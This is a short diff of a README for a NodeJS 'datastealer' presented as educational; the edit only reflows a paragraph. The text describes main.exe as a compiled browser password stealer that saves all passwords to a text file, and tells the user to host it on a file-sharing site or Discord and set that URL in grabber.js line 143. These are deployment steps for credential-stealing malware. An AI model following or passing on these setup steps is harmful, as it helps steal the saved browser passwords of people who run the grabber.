@@ -8,9 +8,8 @@ Advanced **datastealer** coded in NodeJS for educational purposes.
 
 ## Setup
 
-**Uploading main.exe:**
-
-Main.exe is a compiled browser passwords stealer, it will save all passwords in a .txt
+**Uploading main.exe:** 
+ Main.exe is a compiled browser passwords stealer, it will save all passwords in a .txt
 We're using it since NodeJS isn't able yet to decrypt chromium passowrds.
 Upload it in a file hosting website (or even send it to discord to someone and copy the url) and change the url in grabber.js line 143
 
